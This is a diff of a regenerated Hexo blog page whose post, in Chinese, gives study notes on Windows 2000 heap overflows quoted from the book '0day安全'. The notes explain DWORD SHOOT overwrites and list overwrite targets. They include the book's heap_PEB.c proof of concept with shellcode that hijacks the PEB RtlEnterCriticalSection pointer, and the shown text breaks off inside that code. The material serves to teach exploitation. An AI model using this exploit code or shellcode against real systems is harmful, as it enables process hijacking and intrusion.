@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.0">
+<meta name="generator" content="Hexo 4.2.1">
   <link rel="apple-touch-icon" sizes="180x180" href="/favicon/eye.ico">
   <link rel="icon" type="image/png" sizes="32x32" href="/favicon/eye.ico">
   <link rel="icon" type="image/png" sizes="16x16" href="/favicon/eye.ico">
@@ -16,21 +16,21 @@
 
 <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
 <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
-  <link rel="stylesheet" href="/lib/pace/pace-theme-flash.min.css">
-  <script src="/lib/pace/pace.min.js"></script>
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/fancybox@3/dist/css/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1/themes/blue/pace-theme-minimal.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1/pace.min.js"></script>
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"dog.wtf","root":"/","scheme":"Muse","version":"7.8.0","exturl":true,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"dog.wtf","root":"/","scheme":"Muse","version":"8.0.0-rc.2","exturl":true,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="Title(EN): Heap Overflow Learning Notes(Win2K) #2 Author: dog2   堆溢出原理及利用 1. 堆溢出原理堆管理系统的三类操作：堆块分配、堆块释放和堆块合并归根结底都是堆链表的修改。例如，分配就是将堆块从空表中“卸下”；释放是把堆块“链入”空表；合并稍微复杂点，但也可以看成是把若干个堆块先从空表中“卸下”，修改块首信息（大小），之后把更新">
+  <meta name="description" content="Title(EN): Heap Overflow Learning Notes(Win2K) #2 Author: dog2   堆溢出原理及利用  1. 堆溢出原理 堆管理系统的三类操作：堆块分配、堆块释放和堆块合并归根结底都是堆链表的修改。例如，分配就是将堆块从空表中“卸下”；释放是把堆块“链入”空表；合并稍微复杂点，但也可以看成是把若干个堆块先从空表中“卸下”，修改块首信息（大小），之后把">
 <meta property="og:type" content="article">
 <meta property="og:title" content="堆溢出学习笔记(Win2K) (下)">
 <meta property="og:url" content="http://dog.wtf/tech/heap-overflow-learning-notes-2/index.html">
 <meta property="og:site_name" content="雪泥鴻爪">
-<meta property="og:description" content="Title(EN): Heap Overflow Learning Notes(Win2K) #2 Author: dog2   堆溢出原理及利用 1. 堆溢出原理堆管理系统的三类操作：堆块分配、堆块释放和堆块合并归根结底都是堆链表的修改。例如，分配就是将堆块从空表中“卸下”；释放是把堆块“链入”空表；合并稍微复杂点，但也可以看成是把若干个堆块先从空表中“卸下”，修改块首信息（大小），之后把更新">
+<meta property="og:description" content="Title(EN): Heap Overflow Learning Notes(Win2K) #2 Author: dog2   堆溢出原理及利用  1. 堆溢出原理 堆管理系统的三类操作：堆块分配、堆块释放和堆块合并归根结底都是堆链表的修改。例如，分配就是将堆块从空表中“卸下”；释放是把堆块“链入”空表；合并稍微复杂点，但也可以看成是把若干个堆块先从空表中“卸下”，修改块首信息（大小），之后把">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://dog.wtf/tech/heap-overflow-learning-notes-2/0day_5_3_1.png">
 <meta property="og:image" content="http://dog.wtf/tech/heap-overflow-learning-notes-2/0day_5_3_2.png">
@@ -118,9 +118,9 @@
       <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
     <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
+        <span class="toggle-line toggle-line-first"></span>
+        <span class="toggle-line toggle-line-middle"></span>
+        <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
 
@@ -140,7 +140,6 @@
     </div>
   </div>
 </div>
-
 
 
 
@@ -173,7 +172,7 @@
   </li>
         <li class="menu-item menu-item-commonweal">
 
-    <a href="/404.html" rel="section"><i class="fa fa-heartbeat fa-fw"></i>4♡4</a>
+    <a href="/404.html" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -250,7 +249,7 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-calendar"></i>
               </span>
-              <span class="post-meta-item-text">Posted</span>
+              <span class="post-meta-item-text">Posted on</span>
 
               <time title="Created: 2016-06-01 12:34:56" itemprop="dateCreated datePublished" datetime="2016-06-01T12:34:56+09:00">2016-06-01</time>
             </span>
@@ -286,18 +285,18 @@
   </span>
   
   <br>
-            <span class="post-meta-item" title="Word Count">
+            <span class="post-meta-item" title="Symbols count in article">
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-                <span class="post-meta-item-text">Word Count: </span>
-              <span>14k</span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>13k</span>
             </span>
-            <span class="post-meta-item" title="Reading Time">
+            <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-                <span class="post-meta-item-text">Reading Time &asymp;</span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
               <span>12 mins.</span>
             </span>
 
@@ -314,46 +313,45 @@
 <li>Title(EN): <em><strong>Heap Overflow Learning Notes(Win2K) #2</strong></em></li>
 <li>Author: dog2</li>
 </ul>
-<hr>
-<h2 id="堆溢出原理及利用"><a href="#堆溢出原理及利用" class="headerlink" title="堆溢出原理及利用"></a>堆溢出原理及利用</h2><hr>
-<h3 id="1-堆溢出原理"><a href="#1-堆溢出原理" class="headerlink" title="1. 堆溢出原理"></a>1. 堆溢出原理</h3><blockquote><p>堆管理系统的三类操作：堆块分配、堆块释放和堆块合并归根结底都是堆链表的修改。例如，分配就是将堆块从空表中“卸下”；释放是把堆块“链入”空表；合并稍微复杂点，但也可以看成是把若干个堆块先从空表中“卸下”，修改块首信息（大小），之后把更新的新块“链入”空表。</p>
+<hr />
+<h2 id="堆溢出原理及利用">堆溢出原理及利用</h2>
+<hr />
+<h3 id="堆溢出原理">1. 堆溢出原理</h3>
+<blockquote><p>堆管理系统的三类操作：堆块分配、堆块释放和堆块合并归根结底都是堆链表的修改。例如，分配就是将堆块从空表中“卸下”；释放是把堆块“链入”空表；合并稍微复杂点，但也可以看成是把若干个堆块先从空表中“卸下”，修改块首信息（大小），之后把更新的新块“链入”空表。</p>
 <p>所有“卸下”和“链入”堆块的工作都发生在链表，如果我们能伪造链表结点的指针，在“卸下”和“链入”的过程中就有可能获得一次读写内存的机会。</p>
 <p>堆溢出利用的精髓就是用精心构造的数据去溢出下一个堆块的块首，改写块首中的前向指针(flink)和后向指针(blink)，然后再分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。</p>
 <p>我们把这种能够向内存任意位置写入任意数据的机会成为”DWORD SHOOT“。注意：DWORD SHOOT发生时，我们不但可以控制射击的目标（任意地址），还可以选用适当的子弹（4字节恶意数据）。</p>
 <p>这里举一个例子来说明链表操作中DWORD SHOOT究竟是怎样发生的。将一个结点从双向链表中“卸下”的函数很可能是类似这样的。</p>
 </blockquote>
-
 <a id="more"></a>
-
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	node -&gt; <span class="built_in">blink</span> -&gt; flink = node -&gt; flink;</span><br><span class="line">	node -&gt; flink -&gt; <span class="built_in">blink</span> = node -&gt; <span class="built_in">blink</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <blockquote><p>按照这个函数的逻辑，正常拆卸过程中链表的变化过程如图5.3.1所示。</p>
 <p>当堆溢出发生时，非法数据可以淹没下一个堆块块首。这是，块首是可以被攻击者控制的，即块首中存放的前向指针（flink）和后向指针（blink）是可以被攻击者伪造的。当这个堆块被从双向链表中”卸下“时，node -&gt; blink -&gt; flink = node -&gt; flink 将把伪造的flink指针值写入伪造的blink所指的地址中去，从而发生DWORD SHOOT。这个过程如图5.3.2所示。</p>
 <footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P163-164</cite></footer></blockquote>
-
-<img data-src="/tech/heap-overflow-learning-notes-2/0day_5_3_1.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P165 -&gt; 图5.3.1">
-
-<img data-src="/tech/heap-overflow-learning-notes-2/0day_5_3_2.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P165 -&gt; 图5.3.2">
-
-<h3 id="2-堆溢出利用"><a href="#2-堆溢出利用" class="headerlink" title="2. 堆溢出利用"></a>2. 堆溢出利用</h3><blockquote><p>DWORD SHOOT的常用目标（Windows XP SP1之前的平台）大概可以概括为以下几类。</p>
-<p>(1) 内存变量：修改能够影响程序执行的重要标志变量，往往可以改变程序流程。例如，更改身份验证函数的返回值就可以直接通过认证机制。2.2节中修改邻接变量的小试验就是这种利用方式的例子。在这种应用场景中，DWORD SHOOT要比栈溢出强大得多，因为栈溢出时溢出的数据必须连续，而DWORD SHOOT可以更改内存中任意地址的数据。</p>
-<p>(2) 代码逻辑：修改代码段重要函数的关键逻辑有时可以达到一定攻击效果。例如，程序分支处的判断逻辑，或者把身份认证函数的调用指令覆盖为0x90(nop)。这种方法有点类似于软件破解技术中的”爆破“——通过更改一个字节而改变整个程序的流程，第1章中的破解小试验就是这种应用的例子。</p>
-<p>(3) 函数返回地址：栈溢出修改函数返回地址能够劫持进程，堆溢出也一样可以利用DWORD SHOOT更改函数返回地址。但由于栈帧移位的原因，函数返回地址往往是不固定的。甚至在同一操作系统和补丁版本下连续运行两次栈状态都会有不同，故DWORD SHOOT在这种情况下有一定局限性，因为移动的靶子不好瞄准。</p>
-<p>(4) 攻击异常处理机制：当程序产生异常时，Windows会转入异常处理机制。堆溢出很容易引起异常，因此异常处理机制所使用的重要数据结构往往会成为DWORD SHOOT的上等目标，这包括S.E.H（structure exception handler）、F.V.E.H（First Vectored Exception Handler）、进程环境块（P.E.B）中的U.E.F（Unhandled Exception Filter）、线程环境块（T.E.B）中存放的第一个S.E.H指针（T.E.H）。</p>
-<p>(5) 函数指针：系统有时会使用一些函数指针，比如调用动态链接库中的函数、C++中的虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功劫持进程。但可惜的是，不是每一个漏洞都可以使用这项技术，这取决于软件的开发方式。</p>
-<p>(6) P.E.B中线程同步函数的入口地址：天才的黑客们发现在每个进程的P.E.B中都存放着一对同步函数指针，指向RtlEnterCriticalSection()和RtlLeaveCriticalSection()，并且在进程退出时会被ExitProcess()调用。如果能够通过DWORD SHOOT修改这对指针中的其中一个，那么在程序退出时ExitProcess()将会被骗去调用我们的shellcode。由于P.E.B的位置始终不会变化，这对指针在P.E.B中的偏移也始终不变，这使得利用堆溢出开发出适用于不同操作系统版本和补丁版本的exploit成为可能。这种方法一经提出就立刻成为Windows平台下堆溢出哭一边给的是最经典方法之一，因为静止的靶子比活动的靶子好打得多，我们只需要把枪架好，闭着眼睛扣扳机就是了。</p>
+<img src="/tech/heap-overflow-learning-notes-2/0day_5_3_1.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P165 -&gt; 图5.3.1">
+<img src="/tech/heap-overflow-learning-notes-2/0day_5_3_2.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P165 -&gt; 图5.3.2">
+<h3 id="堆溢出利用">2. 堆溢出利用</h3>
+<blockquote><p>DWORD SHOOT的常用目标（Windows XP SP1之前的平台）大概可以概括为以下几类。</p>
+<ol type="1">
+<li><p>内存变量：修改能够影响程序执行的重要标志变量，往往可以改变程序流程。例如，更改身份验证函数的返回值就可以直接通过认证机制。2.2节中修改邻接变量的小试验就是这种利用方式的例子。在这种应用场景中，DWORD SHOOT要比栈溢出强大得多，因为栈溢出时溢出的数据必须连续，而DWORD SHOOT可以更改内存中任意地址的数据。</p></li>
+<li><p>代码逻辑：修改代码段重要函数的关键逻辑有时可以达到一定攻击效果。例如，程序分支处的判断逻辑，或者把身份认证函数的调用指令覆盖为0x90(nop)。这种方法有点类似于软件破解技术中的”爆破“——通过更改一个字节而改变整个程序的流程，第1章中的破解小试验就是这种应用的例子。</p></li>
+<li><p>函数返回地址：栈溢出修改函数返回地址能够劫持进程，堆溢出也一样可以利用DWORD SHOOT更改函数返回地址。但由于栈帧移位的原因，函数返回地址往往是不固定的。甚至在同一操作系统和补丁版本下连续运行两次栈状态都会有不同，故DWORD SHOOT在这种情况下有一定局限性，因为移动的靶子不好瞄准。</p></li>
+<li><p>攻击异常处理机制：当程序产生异常时，Windows会转入异常处理机制。堆溢出很容易引起异常，因此异常处理机制所使用的重要数据结构往往会成为DWORD SHOOT的上等目标，这包括S.E.H（structure exception handler）、F.V.E.H（First Vectored Exception Handler）、进程环境块（P.E.B）中的U.E.F（Unhandled Exception Filter）、线程环境块（T.E.B）中存放的第一个S.E.H指针（T.E.H）。</p></li>
+<li><p>函数指针：系统有时会使用一些函数指针，比如调用动态链接库中的函数、C++中的虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功劫持进程。但可惜的是，不是每一个漏洞都可以使用这项技术，这取决于软件的开发方式。</p></li>
+<li><p>P.E.B中线程同步函数的入口地址：天才的黑客们发现在每个进程的P.E.B中都存放着一对同步函数指针，指向RtlEnterCriticalSection()和RtlLeaveCriticalSection()，并且在进程退出时会被ExitProcess()调用。如果能够通过DWORD SHOOT修改这对指针中的其中一个，那么在程序退出时ExitProcess()将会被骗去调用我们的shellcode。由于P.E.B的位置始终不会变化，这对指针在P.E.B中的偏移也始终不变，这使得利用堆溢出开发出适用于不同操作系统版本和补丁版本的exploit成为可能。这种方法一经提出就立刻成为Windows平台下堆溢出哭一边给的是最经典方法之一，因为静止的靶子比活动的靶子好打得多，我们只需要把枪架好，闭着眼睛扣扳机就是了。</p></li>
+</ol>
 <footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P169-170</cite></footer></blockquote>
-
-<h4 id="1-利用P-E-B（进程环境块）实施攻击"><a href="#1-利用P-E-B（进程环境块）实施攻击" class="headerlink" title="(1) 利用P.E.B（进程环境块）实施攻击"></a>(1) 利用P.E.B（进程环境块）实施攻击</h4><h5 id="1-P-E-B利用原理"><a href="#1-P-E-B利用原理" class="headerlink" title="1) P.E.B利用原理"></a>1) P.E.B利用原理</h5><blockquote><p>Windows为了同步进程下的多个线程，使用了一些同步措施，如锁机制（lock）、信号量（semaphore）、临界区（critical section）等。许多操作都要用到这些同步机制。</p>
+<h4 id="利用p.e.b进程环境块实施攻击">(1) 利用P.E.B（进程环境块）实施攻击</h4>
+<h5 id="p.e.b利用原理">1) P.E.B利用原理</h5>
+<blockquote><p>Windows为了同步进程下的多个线程，使用了一些同步措施，如锁机制（lock）、信号量（semaphore）、临界区（critical section）等。许多操作都要用到这些同步机制。</p>
 <p>当进程退出时，ExitProcess()函数要做很多善后工作，其中必然需要用到临界区函数RtlEnterCriticalSection()和RtlLeaveCriticalSection()来同步线程防止“脏数据”的产生。</p>
 <p>不知什么原因，微软的工程师似乎堆ExitProcess()情有独钟，因为它调用临界区的方法比较特殊，是通过进程环境块P.E.B中偏移0x20处存放的函数指针来间接完成的。具体说来就是在0x7FFDF020处存放着指向RtlEnterCriticalSection()的指针，在0x7FFDF024处存放着指向RtlLeaveCriticalSection()的指针。</p>
 <p><em><strong>题外话：从Windows 2003 Server开始，微软已经修改了这里的实现。</strong></em></p>
 <footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P170</cite></footer></blockquote>
-
-<h5 id="2-实验"><a href="#2-实验" class="headerlink" title="2) 实验"></a>2) 实验</h5><p>本实验通过淹没尾块块首，来触发DWORD SHOOT以修改P.E.B中0x20处存放的指向RtlEnterCriticalSection()函数的指针，导致程序需要调用它时实际却执行了shellcode。</p>
+<h5 id="实验">2) 实验</h5>
+<p>本实验通过淹没尾块块首，来触发DWORD SHOOT以修改P.E.B中0x20处存放的指向RtlEnterCriticalSection()函数的指针，导致程序需要调用它时实际却执行了shellcode。</p>
 <p>实验代码如下:</p>
 <figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P171 -> heap_PEB.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">POC code of chapter 6.4 in book "Vulnerability Exploit and Analysis Technique"</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">file name	: heap_PEB.c</span></span><br><span class="line"><span class="comment">author		: failwest  </span></span><br><span class="line"><span class="comment">date		: 2007.04.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">description	: demo show of heap overrun, shellcode was executed</span></span><br><span class="line"><span class="comment">			  function pointer of RtlEnterCriticalSection was changed in PEB</span></span><br><span class="line"><span class="comment">			  via DWORD shooting</span></span><br><span class="line"><span class="comment">			  Some address may need to reset via run time debugging</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Noticed		:	1 only run on windows 2000</span></span><br><span class="line"><span class="comment">				2 complied with VC 6.0</span></span><br><span class="line"><span class="comment">				3 build into release version</span></span><br><span class="line"><span class="comment">				4 used for run time debugging</span></span><br><span class="line"><span class="comment">version		: 1.0</span></span><br><span class="line"><span class="comment">E-mail		: failwest@gmail.com</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">	Only for educational purposes    enjoy the fun from exploiting :)</span></span><br><span class="line"><span class="comment">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";//200 bytes 0x90</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="comment">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="comment">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="comment">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="comment">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="comment">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="comment">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="comment">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="comment">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="comment">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="comment">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x16\x01\x1A\x00\x00\x10\x00\x00"// head of the ajacent free block</span></span><br><span class="line"><span class="comment">"\x88\x06\x52\x00\x20\xf0\xfd\x7f";</span></span><br><span class="line"><span class="comment">//0x00520688 is the address of shellcode in first heap block </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">//repaire the pointer which shooted by heap over run</span></span><br><span class="line"><span class="string">"\xB8\x20\xF0\xFD\x7F"</span>  <span class="comment">//MOV EAX,7FFDF020</span></span><br><span class="line"><span class="string">"\xBB\x4C\xAA\xF8\x77"</span>  <span class="comment">//MOV EBX,77F8AA4C the address here may releated to your OS</span></span><br><span class="line"><span class="string">"\x89\x18"</span>				<span class="comment">//MOV DWORD PTR DS:[EAX],EBX</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span 